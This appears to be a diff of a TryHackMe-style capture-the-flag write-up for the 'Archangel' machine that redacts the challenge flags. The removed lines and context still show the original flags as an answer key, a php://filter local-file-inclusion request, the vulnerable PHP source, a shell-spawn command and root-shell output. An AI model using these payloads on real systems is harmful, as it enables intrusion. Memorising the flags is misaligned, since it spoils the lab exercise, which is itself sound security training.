@@ -35,7 +35,7 @@ Next, let's add this domain to our `/etc/hosts` file and explore the web applica
 echo "TARGET_IP   mafialive.thm" >> /etc/hosts
 ```
 
-Now, let's visit `mafialive.thm` in our browser, and as soon as we do we get our Flag 1 - `thm{f0und_th3_r1ght_h0st_n4m3}`.
+Now, let's visit `mafialive.thm` in our browser, and as soon as we do we get our Flag 1 - `thm{*redacted*}`.
 
 ![HostName](./Resources/hostname.png)
 
@@ -81,10 +81,11 @@ It looks like there are some filtering protections on the target. We need to get
 
 After trying various PHP filters, we eventually get:
 
-```
+```bash
 http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
 
-CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 
+CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycmmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3
+---SNIP---
 ```
 
 Let's base64 decode to get the source script:
@@ -100,7 +101,7 @@ Let's base64 decode to get the source script:
     </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
         <?php
 
-	    //FLAG: thm{explo1t1ng_lf1}
+	    //FLAG: thm{REDACTED}
 
             function containsStr($str, $substr) {
                 return strpos($str, $substr) !== false;
@@ -120,7 +121,7 @@ Let's base64 decode to get the source script:
 </html>
 ```
 
-From the source code, we also get our next flag - `thm{explo1t1ng_lf1}`.
+From the source code, we also get our next flag - `thm{REDACTED}`.
 
 ### Filter Bypass
 
@@ -200,7 +201,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ## User Flag
 
-We navigate to the `/home/archangel` directory and find `user.txt`. That is the user flag - `thm{lf1_t0_rc3_1s_tr1cky}`.
+We navigate to the `/home/archangel` directory and find `user.txt`. That is the user flag - `thm{REDACTED}`.
 
 ![User Flag](./Resources/userflag.png)
 
@@ -293,10 +294,10 @@ drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
 -rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
 archangel@ubuntu:~/secret$ cat user2.txt
 cat user2.txt
-thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+thm{REDACTED}
 ```
 
-That's our second user flag - `thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`.
+That's our second user flag - `thm{REDACTED}`.
 
 ### Vertical Escalation (SUID Binary)
 
@@ -364,14 +365,14 @@ root@ubuntu:~/secret#
 
 ## Root Flag
 
-Finally, let's get the `/root/root.txt` flag - `thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`
+Finally, let's get the `/root/root.txt` flag - `thm{REDACTED}`
 
 ```bash
 root@ubuntu:~/secret# cd /root
 cd /root
 root@ubuntu:/root# cat root.txt
 cat root.txt
-thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
+thm{REDACTED}
 root@ubuntu:/root#
 ```
 
@@ -402,7 +403,7 @@ Challenge solved!
 
 2. Find flag 1
 
-   **Ans.** *thm{f0und_th3_r1ght_h0st_n4m3}*
+   **Ans.** *thm{**redacted**}*
 
 3. Look for a page under development
 
@@ -410,18 +411,18 @@ Challenge solved!
 
 4. Find flag 2
 
-   **Ans.** *thm{explo1t1ng_lf1}*
+   **Ans.** *thm{**redacted**}*
 
 5. Get a shell and find the user flag
 
-   **Ans.** *thm{lf1_t0_rc3_1s_tr1cky}*
+   **Ans.** *thm{**redacted**}*
 
 ### Task 3 - Root the Machine
 
 1. Get User 2 flag
 
-   **Ans.** *thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}*
+   **Ans.** *thm{**redacted**}*
 
 2. Root the machine and find the root flag
 
-   **Ans.** *thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}*
+   **Ans.** *thm{**redacted**}*
